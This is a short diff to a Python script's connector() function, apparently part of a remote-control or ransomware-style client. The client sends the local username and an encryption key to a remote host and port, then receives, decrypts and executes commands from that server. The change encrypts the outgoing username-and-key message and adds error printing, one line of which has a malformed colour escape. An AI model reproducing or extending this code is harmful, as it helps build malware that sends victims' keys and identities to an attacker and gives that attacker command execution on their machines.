@@ -54,7 +54,7 @@ def connector():
         print("Connected to %s on port %s" % (host, port))
         print("Listening...\n")
         #print(cipher.encrypt(_key)) # Debug
-        server.send('USER$' + getpass.getuser() + '$KEY$' + cipher.encrypt(_key))
+        server.send(cipher.encrypt('USER$' + getpass.getuser() + '$KEY$' + _key))
     except Exception as e:
         print("\033[1;91m[ ! ]\033[0m Unable to connect to %s on port %s" % (host, port))
         print(e)
@@ -73,8 +73,9 @@ def connector():
                     try:
                         data = cipher.decrypt(data)
                     except Exception as e:
+                        print(data)
                         print(e)
-                        print('[ERROR] Failed to execute command %s' % data)
+                        print('\033[1;91m[ERROR][0m Failed to execute command %s' % data)
 
                 if not data:
                     print("\033[1;91m[!]\033[0m Connection has ended")
